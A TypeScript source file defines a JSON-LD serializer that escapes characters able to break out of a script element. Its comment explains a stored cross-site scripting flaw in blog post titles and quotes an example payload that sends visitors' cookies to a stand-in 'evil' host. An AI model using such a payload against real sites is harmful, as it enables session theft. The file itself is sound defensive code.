/**
 * Safe serialization of JSON-LD for embedding in a `<script>` element.
 *
 * `JSON.stringify` escapes what JSON needs escaped, and `<` is not one of those
 * things. Inside `<script type="application/ld+json">` the HTML parser is still
 * scanning for `</script`, so a value containing `</script><script>...` ends
 * the JSON-LD block early and everything after it is parsed as executable
 * markup.
 *
 * Blog post titles reach this sink from the crawlproof/outrank ingestion
 * webhooks - content the platform does not author - so a post titled
 * `</script><script>fetch('//evil/'+document.cookie)</script>` executed for
 * every visitor to that page. The site's CSP allows 'unsafe-inline' for
 * script-src, so the CSP does not stop it either.
 *
 * Escaping `<`, `>` and `&` as JSON unicode escapes keeps the document valid
 * JSON (parsers decode \u003c back to `<`) while making it impossible to
 * terminate the script element or open a new tag. U+2028 and U+2029 are
 * escaped too: they are legal inside a JSON string but are line terminators in
 * JavaScript, so a consumer that evaluates the block would break on them.
 */
const JSON_LD_ESCAPES: Record<string, string> = {
  '<': '\\u003c',
  '>': '\\u003e',
  '&': '\\u0026',
  '\u2028': '\\u2028',
  '\u2029': '\\u2029',
};

export function serializeJsonLd(value: unknown): string {
  return JSON.stringify(value).replace(
    /[<>&\u2028\u2029]/g,
    (char) => JSON_LD_ESCAPES[char],
  );
}
